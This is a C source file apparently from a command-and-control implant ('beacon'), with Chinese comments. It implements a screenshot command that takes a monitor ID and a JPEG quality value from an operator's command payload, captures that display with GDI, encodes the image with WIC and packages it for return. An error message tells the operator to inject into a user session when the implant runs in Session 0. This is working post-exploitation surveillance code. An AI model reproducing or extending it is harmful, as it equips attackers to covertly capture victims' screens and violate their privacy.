#define COBJMACROS

#include "beacon_commands.h"

#include <objbase.h>
#include <oleauto.h>
#include <propidl.h>
#include <wincodec.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "windowscodecs.lib")

/* 用于枚举显示监视器以按索引查找目标的状态 */
typedef struct MonitorSearch {
    INT target;
    INT index;
    INT found;
    RECT rect;
} MonitorSearch;

/* 构建包含给定消息的错误响应 ByteBuf */
static ByteBuf ScreenshotError(const CHAR* text)
{
    ByteBuf out;
    BbInit(&out);
    BbPrintf(&out, "error: %s", text ? text : "screenshot failed");
    return out;
}

/* 监视器枚举回调；捕获目标监视器的矩形区域 */
static BOOL CALLBACK ScreenshotEnumMonitor(HMONITOR monitor, HDC hdc, LPRECT rect, LPARAM user)
{
    MonitorSearch* state = (MonitorSearch*)user;
    MONITORINFO info;
    (VOID)hdc;
    (VOID)rect;

    /* 找到目标监视器；捕获其矩形区域 */
    if (state->index == state->target) {
        memset(&info, 0, sizeof(info));
        info.cbSize = sizeof(info);
        if (GetMonitorInfoW(monitor, &info)) {
            state->rect = info.rcMonitor;
        } else {
            state->rect = *rect;
        }
        state->found = 1;
        return FALSE;
    }

    ++state->index;
    return TRUE;
}

/* 按索引查找监视器并返回其矩形区域和活动监视器数量 */
static INT ScreenshotFindMonitor(INT monitor_id, RECT* out_rect, INT* active_count)
{
    MonitorSearch state;
    memset(&state, 0, sizeof(state));
    state.target = monitor_id;
    EnumDisplayMonitors(NULL, NULL, ScreenshotEnumMonitor, (LPARAM)&state);
    *active_count = state.found ? state.index + 1 : state.index;
    if (!state.found) {
        return 0;
    }
    *out_rect = state.rect;
    return 1;
}

/* 使用 GDI BitBlt 将屏幕矩形区域捕获为 HBITMAP */
static HBITMAP ScreenshotCaptureRect(const RECT* rect)
{
    INT width = rect->right - rect->left;
    INT height = rect->bottom - rect->top;
    HDC screen_dc;
    HDC mem_dc;
    HBITMAP bitmap;
    HGDIOBJ old_obj;

    if (width <= 0 || height <= 0) {
        return NULL;
    }

    /* 获取屏幕设备上下文 */
    screen_dc = GetDC(NULL);
    if (!screen_dc) {
        return NULL;
    }

    /* 创建兼容的内存 DC 和位图 */
    mem_dc = CreateCompatibleDC(screen_dc);
    if (!mem_dc) {
        ReleaseDC(NULL, screen_dc);
        return NULL;
    }

    bitmap = CreateCompatibleBitmap(screen_dc, width, height);
    if (!bitmap) {
        DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        return NULL;
    }

    /* 将屏幕内容位块传输到位图中 */
    old_obj = SelectObject(mem_dc, bitmap);
    if (!BitBlt(mem_dc, 0, 0, width, height, screen_dc, rect->left, rect->top, SRCCOPY | CAPTUREBLT)) {
        SelectObject(mem_dc, old_obj);
        DeleteObject(bitmap);
        DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        return NULL;
    }

    SelectObject(mem_dc, old_obj);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
    return bitmap;
}

/* 将流的内容读取到 ByteBuf 中 */
static HRESULT ScreenshotStreamToBuffer(IStream* stream, ByteBuf* image)
{
    STATSTG statstg;
    LARGE_INTEGER zero;
    ULONG read = 0;
    HRESULT hr;

    /* 查询流大小 */
    memset(&statstg, 0, sizeof(statstg));
    hr = IStream_Stat(stream, &statstg, STATFLAG_NONAME);
    if (FAILED(hr)) {
        return hr;
    }
    if (statstg.cbSize.QuadPart > 0xffffffffull) {
        return E_OUTOFMEMORY;
    }

    /* 分配缓冲区并定位到起始位置 */
    BbInit(image);
    if (!BbReserve(image, (SIZE_T)statstg.cbSize.QuadPart)) {
        return E_OUTOFMEMORY;
    }

    zero.QuadPart = 0;
    hr = IStream_Seek(stream, zero, STREAM_SEEK_SET, NULL);
    if (FAILED(hr)) {
        return hr;
    }

    /* 将流数据读入缓冲区 */
    hr = IStream_Read(stream, image->data, (ULONG)statstg.cbSize.QuadPart, &read);
    if (FAILED(hr)) {
        return hr;
    }
    image->len = read;
    return S_OK;
}

/* 使用 WIC 将 HBITMAP 编码为 JPEG 并存入 ByteBuf */
static HRESULT ScreenshotEncodeJpeg(HBITMAP bitmap, INT quality, ByteBuf* image)
{
    HRESULT hr;
    IWICImagingFactory* factory = NULL;
    IWICBitmap* source = NULL;
    IWICFormatConverter* converter = NULL;
    IWICBitmapEncoder* encoder = NULL;
    IWICBitmapFrameEncode* frame = NULL;
    IPropertyBag2* props = NULL;
    IStream* stream = NULL;
    GUID pixel_format = GUID_WICPixelFormat24bppBGR;
    INT should_uninit = 0;

    /* 初始化 COM */
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) {
        should_uninit = 1;
    } else if (hr != RPC_E_CHANGED_MODE) {
        return hr;
    }

    /* 创建 WIC 成像工厂 */
    hr = CoCreateInstance(&CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWICImagingFactory, (VOID**)&factory);
    if (FAILED(hr)) {
        goto cleanup;
    }

    /* 从 GDI 句柄创建 WIC 位图 */
    hr = IWICImagingFactory_CreateBitmapFromHBITMAP(factory, bitmap, NULL, WICBitmapIgnoreAlpha, &source);
    if (FAILED(hr)) {
        goto cleanup;
    }

    /* 设置格式转换器为 24bpp BGR */
    hr = IWICImagingFactory_CreateFormatConverter(factory, &converter);
    if (FAILED(hr)) {
        goto cleanup;
    }

    hr = IWICFormatConverter_Initialize(converter,
                                        (IWICBitmapSource*)source,
                                        &GUID_WICPixelFormat24bppBGR,
                                        WICBitmapDitherTypeNone,
                                        NULL,
                                        0.0,
                                        WICBitmapPaletteTypeCustom);
    if (FAILED(hr)) {
        goto cleanup;
    }

    /* 为编码输出创建内存流 */
    hr = CreateStreamOnHGlobal(NULL, TRUE, &stream);
    if (FAILED(hr)) {
        goto cleanup;
    }

    /* 初始化 JPEG 编码器 */
    hr = IWICImagingFactory_CreateEncoder(factory, &GUID_ContainerFormatJpeg, NULL, &encoder);
    if (FAILED(hr)) {
        goto cleanup;
    }

    hr = IWICBitmapEncoder_Initialize(encoder, stream, WICBitmapEncoderNoCache);
    if (FAILED(hr)) {
        goto cleanup;
    }

    hr = IWICBitmapEncoder_CreateNewFrame(encoder, &frame, &props);
    if (FAILED(hr)) {
        goto cleanup;
    }

    /* 设置 JPEG 质量属性 */
    if (props) {
        PROPBAG2 option;
        VARIANT value;
        memset(&option, 0, sizeof(option));
        option.pstrName = L"ImageQuality";
        VariantInit(&value);
        value.vt = VT_R4;
        value.fltVal = (float)quality / 100.0f;
        (VOID)IPropertyBag2_Write(props, 1, &option, &value);
    }

    hr = IWICBitmapFrameEncode_Initialize(frame, props);
    if (FAILED(hr)) {
        goto cleanup;
    }

    /* 从转换器源设置帧尺寸 */
    {
        UINT width = 0;
        UINT height = 0;
        hr = IWICBitmapSource_GetSize((IWICBitmapSource*)converter, &width, &height);
        if (FAILED(hr)) {
            goto cleanup;
        }
        hr = IWICBitmapFrameEncode_SetSize(frame, width, height);
        if (FAILED(hr)) {
            goto cleanup;
        }
    }

    hr = IWICBitmapFrameEncode_SetPixelFormat(frame, &pixel_format);
    if (FAILED(hr)) {
        goto cleanup;
    }

    /* 写入转换后的位图数据并提交 */
    hr = IWICBitmapFrameEncode_WriteSource(frame, (IWICBitmapSource*)converter, NULL);
    if (FAILED(hr)) {
        goto cleanup;
    }

    hr = IWICBitmapFrameEncode_Commit(frame);
    if (FAILED(hr)) {
        goto cleanup;
    }

    hr = IWICBitmapEncoder_Commit(encoder);
    if (FAILED(hr)) {
        goto cleanup;
    }

    /* 将编码后的流读入输出缓冲区 */
    hr = ScreenshotStreamToBuffer(stream, image);

cleanup:
    if (props) IPropertyBag2_Release(props);
    if (frame) IWICBitmapFrameEncode_Release(frame);
    if (encoder) IWICBitmapEncoder_Release(encoder);
    if (stream) IStream_Release(stream);
    if (converter) IWICFormatConverter_Release(converter);
    if (source) IWICBitmap_Release(source);
    if (factory) IWICImagingFactory_Release(factory);
    if (should_uninit) CoUninitialize();
    return hr;
}

/* 处理截图命令：捕获监视器并编码为 JPEG */
ByteBuf CommandScreenshot(Parser* p)
{
    UINT32 arg_count = ParserU32(p);
    UINT32 monitor_u32;
    UINT32 quality_u32;
    DWORD session_id = 0;
    RECT rect;
    INT active_count = 0;
    INT width;
    INT height;
    HBITMAP bitmap;
    ByteBuf image;
    ByteBuf out;
    HRESULT hr;
    CHAR res[64];

    /* 验证参数 */
    if (arg_count < 2) {
        return ScreenshotError("screenshot requires MonitorID and Quality arguments");
    }

    /* 从命令载荷解析监视器 ID 和质量 */
    monitor_u32 = ParserU32(p);
    quality_u32 = ParserU32(p);
    if (p->error[0]) {
        ByteBuf err;
        BbInit(&err);
        BbPrintf(&err, "error: %s", p->error);
        return err;
    }
    if (monitor_u32 > 0x7fffffffu) {
        return ScreenshotError("invalid MonitorID");
    }

    /* 将质量限制在有效范围内 */
    if (quality_u32 < 1u) {
        quality_u32 = 1u;
    } else if (quality_u32 > 100u) {
        quality_u32 = 100u;
    }

    /* 拒绝来自会话 0 的截图尝试（无交互式桌面） */
    if (ProcessIdToSessionId(GetCurrentProcessId(), &session_id) && session_id == 0) {
        return ScreenshotError("current process is running in Session 0; inject into a user session before taking a screenshot");
    }

    /* 定位目标监视器 */
    if (!ScreenshotFindMonitor((INT)monitor_u32, &rect, &active_count)) {
        ByteBuf err;
        BbInit(&err);
        BbPrintf(&err, "error: invalid MonitorID: %lu. Active displays found: %d",
                  (ULONG)monitor_u32, active_count);
        return err;
    }

    /* 捕获屏幕区域 */
    width = rect.right - rect.left;
    height = rect.bottom - rect.top;
    bitmap = ScreenshotCaptureRect(&rect);
    if (!bitmap) {
        return ScreenshotError("failed to capture screen");
    }

    /* 将位图编码为 JPEG */
    BbInit(&image);
    hr = ScreenshotEncodeJpeg(bitmap, (INT)quality_u32, &image);
    DeleteObject(bitmap);
    if (FAILED(hr)) {
        ByteBuf err;
        BbInit(&err);
        BbPrintf(&err, "error: failed to encode image: 0x%08lx", (ULONG)hr);
        BbFree(&image);
        return err;
    }

    /* 打包响应：分辨率字符串、图像大小、时间戳和图像数据 */
    snprintf(res, sizeof(res), "%dx%d", width, height);
    BbInit(&out);
    BbBytes(&out, res, strlen(res));
    BbU64(&out, (UINT64)image.len);
    BbU64(&out, GetUnixTimestamp());
    BbBytes(&out, image.data, image.len);
    BbFree(&image);
    return out;
}
